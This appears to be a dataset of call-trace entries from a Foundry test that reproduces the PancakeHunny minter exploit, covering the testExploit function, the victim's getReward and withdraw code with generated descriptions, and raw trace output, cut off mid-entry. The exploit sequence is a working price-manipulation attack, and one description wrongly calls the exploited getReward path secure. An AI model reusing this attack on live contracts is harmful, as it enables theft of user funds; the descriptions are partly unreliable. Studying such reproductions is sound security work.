[
    {
        "id": "1354691",
        "args": "",
        "original_code": "    function testExploit() public {\n        wbnb.deposit{value: 5.752 ether}();\n        wbnb.transfer(address(this), 5.752 ether);\n\n        //WBNB was swapped to CAKE at PancakeSwap\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(cake);\n        pancakeRouter.swapExactETHForTokens{value: 5.752 ether}(0, path, address(this), 1_622_687_689);\n\n        emit log_named_decimal_uint(\"Swap cake, Cake Balance\", cake.balanceOf(address(this)), 18);\n\n        //The attacker sent CAKE to our HUNNY Minter contract\n        cake.transfer(hunnyMinter, 59_880_957_483_227_401_400);\n\n        //The attacker staked on CAKE-BNB Hive in PancakeHunny\n        cheat.startPrank(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6);\n        //HUNNY Minter was \u201ctricked\u201d to mint more HUNNY tokens\n        cakeVault.getReward();\n        hunny.transfer(address(this), hunny.balanceOf(address(0x515Fb5a7032CdD688B292086cf23280bEb9E31B6)));\n        emit log_named_decimal_uint(\"Hunny Balance\", hunny.balanceOf(address(this)), 18);\n        cheat.stopPrank();\n\n        //The attacker then sold the HUNNY tokens on PancakeSwap\n        address[] memory path2 = new address[](2);\n        path2[0] = address(hunny);\n        path2[1] = address(wbnb);\n        pancakeRouter.swapExactTokensForETH(hunny.balanceOf(address(this)), 0, path2, address(this), 1_622_687_089);\n\n        emit log_named_decimal_uint(\"Swap WBNB, WBEB Balance\", wbnb.balanceOf(address(this)), 18);\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `testExploit` function simulates an attack scenario where an attacker interacts with multiple smart contracts to manipulate token balances and exploit a vulnerability. The function performs the following steps:  \n   - Deposits a specific amount of Ether into a wrapped token (WBNB).  \n   - Transfers the WBNB tokens to the contract itself.  \n   - Swaps WBNB for another token (CAKE) using a decentralized exchange (PancakeSwap).  \n   - Transfers the CAKE tokens to a specific contract (HUNNY Minter).  \n   - Triggers a reward minting process in the HUNNY Minter contract to mint additional HUNNY tokens.  \n   - Sells the HUNNY tokens back for WBNB on PancakeSwap.  \n   The function logs the balances of CAKE and HUNNY tokens at various stages to track the attack's progress.  \n\n2. **Security mechanism:**  \n   The function does not explicitly include security mechanisms to prevent unauthorized access or manipulation. Instead, it demonstrates how an attacker could exploit vulnerabilities in the system. Key observations:  \n   - The function uses `cheat.startPrank` and `cheat.stopPrank` to simulate actions from a specific address, which could be used to bypass access controls.  \n   - There are no access control modifiers (e.g., `onlyOwner`) to restrict who can call this function.  \n   - The function relies on external contracts (e.g., PancakeSwap, HUNNY Minter) without verifying their security or integrity.  \n\n3. **Parameter Function:**  \n   The function does not take any parameters. However, it interacts with several external contracts and tokens, such as `wbnb`, `cake`, `pancakeRouter`, `hunnyMinter`, and `cakeVault`. These are predefined addresses or contract instances used in the attack simulation.  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it emits log events (`emit log_named_decimal_uint`) to display the balances of CAKE and HUNNY tokens at specific stages of the attack. These logs help track the changes in token balances resulting from the exploit.  \n\n**In summary,**  \nThe `testExploit` function simulates an attack where an attacker manipulates token balances and exploits a vulnerability in the HUNNY Minter contract to mint and profit from additional tokens. The function logs the token balances at various stages to demonstrate the attack's effectiveness. However, it lacks security mechanisms to prevent unauthorized access or misuse.",
        "return_value": "Returned"
    },
    {
        "id": "23162",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5752000000000000000 [5.752e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "19244421191052594198292386 [1.924e25], 921966626842733667773738 [9.219e23], 1622687086 [1.622e9]"
    },
    {
        "id": "8062",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0, 5752000000000000000 [5.752e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "56376",
        "args": "119761914966454802925 [1.197e20], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "29983",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 119761914966454802925 [1.197e20]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "19244301429137627743489461 [1.924e25]"
    },
    {
        "id": "534",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "921972378842733667773738 [9.219e23]"
    },
    {
        "id": "531",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "119761914966454802925 [1.197e20]"
    },
    {
        "id": "25183",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 59880957483227401400 [5.988e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "0",
        "args": "0x515Fb5a7032CdD688B292086cf23280bEb9E31B6",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "998250",
        "args": "",
        "original_code": "    function getReward() override public nonReentrant updateReward(msg.sender) {\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            uint before = IBEP20(CAKE).balanceOf(address(this));\n            rewardsToken.withdraw(reward);\n            uint cakeBalance = IBEP20(CAKE).balanceOf(address(this)).sub(before);\n\n            if (address(minter) != address(0) && minter.isMinter(address(this))) {\n                uint performanceFee = minter.performanceFee(cakeBalance);\n                minter.mintFor(CAKE, 0, performanceFee, msg.sender, depositedAt[msg.sender]);\n                cakeBalance = cakeBalance.sub(performanceFee);\n            }\n\n            IBEP20(CAKE).safeTransfer(msg.sender, cakeBalance);\n            emit RewardPaid(msg.sender, cakeBalance);\n        }\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `getReward` function is designed to allow a user to claim their earned rewards. It checks if the user has any rewards stored, and if so, it transfers those rewards to the user's account. Additionally, if a \"minter\" (a special entity that can mint tokens) is involved, it deducts a performance fee from the rewards before transferring the remaining amount to the user. The function also updates the reward balance and emits an event to log the transaction.\n\n2. **Security mechanism:**  \n   - `nonReentrant`: This modifier prevents the function from being called again before the current execution is complete, protecting against reentrancy attacks.  \n   - `updateReward(msg.sender)`: This modifier ensures that the user's reward balance is updated before the function proceeds, preventing outdated or incorrect reward calculations.  \n   - `safeTransfer`: This method safely transfers tokens, reducing the risk of errors or vulnerabilities during the transfer process.  \n\n3. **Parameter Function:**  \n   The function does not take any explicit parameters. Instead, it uses `msg.sender` (the address of the caller) to identify the user claiming the rewards. This ensures that the rewards are correctly assigned to the person making the call.  \n\n4. **Return description:**  \n   The function does not return any value directly. Instead, it performs actions:  \n   - It calculates the reward amount for the user.  \n   - If a minter is involved, it deducts a performance fee from the reward.  \n   - It transfers the remaining reward amount to the user's address.  \n   - It emits an event (`RewardPaid`) to record the transaction details, including the user's address and the amount transferred.  \n\nIn summary, the `getReward` function allows users to claim their rewards securely, ensures accurate reward calculations, and handles potential fees before transferring the final amount to the user.",
        "return_value": "Returned"
    },
    {
        "id": "2531",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "205743",
        "args": "947056504 [9.47e8]",
        "original_code": "    function withdraw(uint256 amount) override public nonReentrant updateReward(msg.sender) {\n        require(amount > 0, \"amount\");\n        _totalSupply = _totalSupply.sub(amount);\n        _balances[msg.sender] = _balances[msg.sender].sub(amount);\n        CAKE_MASTER_CHEF.withdraw(poolId, amount);\n\n        if (address(minter) != address(0) && minter.isMinter(address(this))) {\n            uint _depositedAt = depositedAt[msg.sender];\n            uint withdrawalFee = minter.withdrawalFee(amount, _depositedAt);\n            if (withdrawalFee > 0) {\n                uint performanceFee = withdrawalFee.div(100);\n                minter.mintFor(address(stakingToken), withdrawalFee.sub(performanceFee), performanceFee, msg.sender, _depositedAt);\n                amount = amount.sub(withdrawalFee);\n            }\n        }\n\n        stakingToken.safeTransfer(msg.sender, amount);\n        emit Withdrawn(msg.sender, amount);\n\n        _harvest();\n    }\n\n    function withdrawAll() override external {\n        uint _withdraw = withdrawableBalanceOf(msg.sender);\n        if (_withdraw > 0) {\n            withdraw(_withdraw);\n        }\n        getReward();\n    }\n\n",
        "description": "1. **Core functions:**  \n   The `withdraw` function allows a user to withdraw a specified amount of tokens from a staking pool. It reduces the total supply of tokens and updates the user's balance accordingly. Additionally, it interacts with an external contract (`CAKE_MASTER_CHEF`) to handle the withdrawal process. If a withdrawal fee applies, it calculates and deducts the fee before transferring the remaining tokens to the user. Finally, it triggers a reward harvesting process.  \n   The `withdrawAll` function enables a user to withdraw their entire available balance from the staking pool. It calculates the withdrawable amount and calls the `withdraw` function to process the withdrawal. Afterward, it ensures the user receives any pending rewards.\n\n2. **Security mechanism:**  \n   - `nonReentrant`: Prevents reentrancy attacks by ensuring the function cannot be called again before the current execution completes.  \n   - `updateReward(msg.sender)`: Updates the user's reward balance before processing the withdrawal to ensure accurate calculations.  \n   - `require(amount > 0, \"amount\")`: Ensures the withdrawal amount is greater than zero to avoid invalid transactions.  \n   - Safe token transfer (`safeTransfer`): Safely transfers tokens to the user, reducing the risk of errors or vulnerabilities.  \n\n3. **Parameter Function:**  \n   - `amount` (in `withdraw`): Specifies the number of tokens the user wants to withdraw. It must be greater than zero.  \n   - `msg.sender`: Represents the address of the user calling the function, ensuring the withdrawal is processed for the correct account.  \n\n4. **Return description:**  \n   - The `withdraw` function does not return a value but performs actions like updating balances, deducting fees, transferring tokens, and emitting an event to log the withdrawal.  \n   - The `withdrawAll` function also does not return a value but calculates the user's total withdrawable balance and processes the withdrawal and reward distribution.  \n\n**In summary,**  \nThe `withdraw` function handles token withdrawals from a staking pool, including fee calculations and token transfers, while the `withdrawAll` function allows users to withdraw their entire balance and claim rewards. Both functions include security measures to prevent attacks and ensure accurate processing.",
        "return_value": "Returned"
    },
    {
        "id": "4761",
        "args": "0, 0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE",
        "original_code": null,
        "description": null,
        "return_value": "16497919378495714627 [1.649e19], 44678848320342009741493349 [4.467e25]"
    },
    {
        "id": "2531",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "531",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "127605",
        "args": "950689188 [9.506e8]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "2531",
        "args": "0x73feaa1eE314F8c655E354234017bE2193C9E24E",
        "original_code": null,
        "description": null,
        "return_value": "126397340034340824520409635 [1.263e26]"
    },
    {
        "id": "17042",
        "args": "0x8488Cb2f54Ecb9AA1cdc1bC83bc1D200BB2f216b, 1000000000000000000 [1e18]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "10242",
        "args": "0x009cF7bC57584b7998236eff51b98A168DceA9B0, 10000000000000000000 [1e19]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "29344",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 2610465783260 [2.61e12]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "531",
        "args": "0x009cF7bC57584b7998236eff51b98A168DceA9B0",
        "original_code": null,
        "description": null,
        "return_value": "1771624928769271520997847 [1.771e24]"
    },
    {
        "id": "23183",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 2610465783260 [2.61e12]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "6083",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 950689188 [9.506e8]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "15183",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 950689188 [9.506e8]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23183",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4, 950689188 [9.506e8]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE",
        "original_code": null,
        "description": null,
        "return_value": "2610465783260 [2.61e12]"
    },
    {
        "id": "21053",
        "args": "2610465783260 [2.61e12]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "10794",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 0x73feaa1eE314F8c655E354234017bE2193C9E24E, 2610465783260 [2.61e12]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "3420",
        "args": "0x0fCd52FD40B77E28062cf9889Dc3779C31c171fE, 2610465783260 [2.61e12]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "531",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4",
        "original_code": null,
        "description": null,
        "return_value": "950689188 [9.506e8]"
    },
    {
        "id": "10466",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "2495",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000109ea28dbdea5e6ec126fbc8c33845dfe812a300"
    },
    {
        "id": "2801",
        "args": "950689188 [9.506e8]",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000000000000000000000000000000000000001735c"
    },
    {
        "id": "692198",
        "args": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0, 95068 [9.506e4], 0x515Fb5a7032CdD688B292086cf23280bEb9E31B6, 1622686342 [1.622e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "495",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x000000000000000000000000109ea28dbdea5e6ec126fbc8c33845dfe812a300"
    },
    {
        "id": "10794",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4, 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 95068 [9.506e4]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "59880957483227496468 [5.988e19]"
    },
    {
        "id": "4686",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "594",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x10ED43C718714eb63d5aA57B78B54704E256024E",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "22486",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 29940478741613748234 [2.994e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "123989",
        "args": "29940478741613748234 [2.994e19], 0, [0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x565b72163f17849832A692A3c5928cc502f46D69], 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 1622687086 [1.622e9]",
        "original_code": null,
        "description": null,
        "return_value": "[29940478741613748234 [2.994e19], 1430825693619362620 [1.43e18], 3239783955655581581588 [3.239e21]]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "19244301429137627743489461 [1.924e25], 921972378842733667773738 [9.219e23], 1622687086 [1.622e9]"
    },
    {
        "id": "2893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "4007269601943522209004015 [4.007e24], 1763928134703263874339 [1.763e21], 1622687080 [1.622e9]"
    },
    {
        "id": "5994",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0, 29940478741613748234 [2.994e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "23155",
        "args": "0, 1430825693619362620 [1.43e18], 0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "8062",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 1430825693619362620 [1.43e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "19244331369616369357237695 [1.924e25]"
    },
    {
        "id": "534",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "921970948017040048411118 [9.219e23]"
    },
    {
        "id": "74515",
        "args": "3239783955655581581588 [3.239e21], 0, 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "39983",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 3239783955655581581588 [3.239e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "686",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "4004029817987866627422427 [4.004e24]"
    },
    {
        "id": "534",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "1765358960396883236959 [1.765e21]"
    },
    {
        "id": "2586",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "594",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x10ED43C718714eb63d5aA57B78B54704E256024E",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "22486",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 29940478741613748234 [2.994e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "55531",
        "args": "29940478741613748234 [2.994e19], 0, [0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 1622687086 [1.622e9]",
        "original_code": null,
        "description": null,
        "return_value": "[29940478741613748234 [2.994e19], 1430821247012251901 [1.43e18]]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "19244331369616369357237695 [1.924e25], 921970948017040048411118 [9.219e23], 1622687086 [1.622e9]"
    },
    {
        "id": "5994",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0, 29940478741613748234 [2.994e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "40255",
        "args": "0, 1430821247012251901 [1.43e18], 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "25162",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 1430821247012251901 [1.43e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "531",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "19244361310095110970985929 [1.924e25]"
    },
    {
        "id": "534",
        "args": "0x0eD7e52944161450477ee417DE9Cd3a859b14fD0",
        "original_code": null,
        "description": null,
        "return_value": "921969517195793036159217 [9.219e23]"
    },
    {
        "id": "686",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "3239783955655581581588 [3.239e21]"
    },
    {
        "id": "534",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "1430821247012251901 [1.43e18]"
    },
    {
        "id": "4858",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "813",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x10ED43C718714eb63d5aA57B78B54704E256024E",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "22658",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 3239783955655581581588 [3.239e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "7320",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "717",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x10ED43C718714eb63d5aA57B78B54704E256024E",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "2420",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 1430821247012251901 [1.43e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "103503",
        "args": "0x565b72163f17849832A692A3c5928cc502f46D69, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 3239783955655581581588 [3.239e21], 1430821247012251901 [1.43e18], 0, 0, 0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 1622687086 [1.622e9]",
        "original_code": null,
        "description": null,
        "return_value": "3239783955655581581588 [3.239e21], 1428406354561261398 [1.428e18], 67542479851940178780 [6.754e19]"
    },
    {
        "id": "2676",
        "args": "0x565b72163f17849832A692A3c5928cc502f46D69, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "original_code": null,
        "description": null,
        "return_value": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "4004029817987866627422427 [4.004e24], 1765358960396883236959 [1.765e21], 1622687086 [1.622e9]"
    },
    {
        "id": "8000",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 3239783955655581581588 [3.239e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "4148",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 1428406354561261398 [1.428e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "78607",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "67542479851940178780 [6.754e19]"
    },
    {
        "id": "686",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "4007269601943522209004015 [4.007e24]"
    },
    {
        "id": "534",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "1766787366751444498357 [1.766e21]"
    },
    {
        "id": "2354",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x07d80AE6f36A5E08Dca74cE884A24D39dB9934ed"
    },
    {
        "id": "686",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "0"
    },
    {
        "id": "9283",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4, 0",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "534",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300",
        "original_code": null,
        "description": null,
        "return_value": "2414892450990503 [2.414e15]"
    },
    {
        "id": "8062",
        "args": "0x12180BB36DdBce325b3be0c087d61Fce39b8f5A4, 2414892450990503 [2.414e15]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "676",
        "args": "0x565b72163f17849832A692A3c5928cc502f46D69, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "original_code": null,
        "description": null,
        "return_value": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F"
    },
    {
        "id": "8103",
        "args": "0x389D2719a9Bcc29583Db89FD9454ADe9e57CD18d, 67542479851940178780 [6.754e19]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "33870",
        "args": "67542479851940178780 [6.754e19]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "537",
        "args": "0x389D2719a9Bcc29583Db89FD9454ADe9e57CD18d",
        "original_code": null,
        "description": null,
        "return_value": "43971261225364311223670 [4.397e22]"
    },
    {
        "id": "22719",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 67542479851940178780 [6.754e19]",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000002d30e5156be31d66"
    },
    {
        "id": "465",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x565b72163f17849832A692A3c5928cc502f46D69"
    },
    {
        "id": "397",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
    },
    {
        "id": "439",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "83542893617359589317122 [8.354e22]"
    },
    {
        "id": "686",
        "args": "0x36118142F8C21a1F3fd806D4A34F56f51F33504F",
        "original_code": null,
        "description": null,
        "return_value": "4007269601943522209004015 [4.007e24]"
    },
    {
        "id": "7241",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "0x0000000000000000000000000000000000000000000000000001c912bfb390ff"
    },
    {
        "id": "25966",
        "args": "10420334114419164281600 [1.042e22]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "29183",
        "args": "0x515Fb5a7032CdD688B292086cf23280bEb9E31B6, 10420334114419164281600 [1.042e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "23166",
        "args": "1563050117162874642240 [1.563e21]",
        "original_code": null,
        "description": null,
        "return_value": "1"
    },
    {
        "id": "57956",
        "args": "1563050117162874642240 [1.563e21], 0xe5F7E3DD9A5612EcCb228392F47b7Ddba8cE4F1a",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "19600",
        "args": "0x109Ea28dbDea5E6ec126FbC8c33845DFe812a300, 0x389D2719a9Bcc29583Db89FD9454ADe9e57CD18d, 1563050117162874642240 [1.563e21]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "10474",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "394",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "594597466749802105709067759973479518 [5.945e35]"
    },
    {
        "id": "416",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "1452931472230382112459038727994510580938743 [1.452e42]"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "4007269601943522209004015 [4.007e24], 1766787366751444498357 [1.766e21], 1622687086 [1.622e9]"
    },
    {
        "id": "8083",
        "args": "0x515Fb5a7032CdD688B292086cf23280bEb9E31B6, 950594120 [9.505e8]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "686",
        "args": "0x515Fb5a7032CdD688B292086cf23280bEb9E31B6",
        "original_code": null,
        "description": null,
        "return_value": "10420334114419164281600 [1.042e22]"
    },
    {
        "id": "29183",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10420334114419164281600 [1.042e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "686",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "10420334114419164281600 [1.042e22]"
    },
    {
        "id": "0",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "686",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
        "original_code": null,
        "description": null,
        "return_value": "10420334114419164281600 [1.042e22]"
    },
    {
        "id": "80346",
        "args": "10420334114419164281600 [1.042e22], 0, [0x565b72163f17849832A692A3c5928cc502f46D69, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1622687089 [1.622e9]",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "893",
        "args": "",
        "original_code": null,
        "description": null,
        "return_value": "4007269601943522209004015 [4.007e24], 1766787366751444498357 [1.766e21], 1622687086 [1.622e9]"
    },
    {
        "id": "15600",
        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x36118142F8C21a1F3fd806D4A34F56f51F33504F, 10420334114419164281600 [1.042e22]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
        "id": "38410",
        "args": "0, 4570936969504711308 [4.57e18], 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x",
        "original_code": null,
        "description": null,
        "return_value": "Returned"
    },
    {
        "id": "23162",
        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 4570936969504711308 [4.57e18]",
        "original_code": null,
        "description": null,
        "return_value": "true"
    },
    {
